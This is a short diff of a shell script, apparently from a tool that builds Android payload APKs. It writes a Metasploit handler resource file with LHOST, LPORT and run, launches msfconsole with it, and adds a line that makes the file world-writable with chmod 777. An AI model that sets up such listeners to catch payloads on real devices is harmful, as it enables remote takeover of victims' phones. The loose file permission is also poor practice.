@@ -115,6 +115,7 @@ function Msfconsole {
 					echo "set LHOST $LHOST" >> $TMP_DIR/handler/$MYAPK.rc
 					echo "set LPORT $LPORT" >> $TMP_DIR/handler/$MYAPK.rc
 					echo "run" >> $TMP_DIR/handler/$MYAPK.rc
+					chmod 777 $TMP_DIR/handler/$MYAPK.rc
 					echo "
 					"
                                         msfconsole -q -r $TMP_DIR/handler/$MYAPK.rc
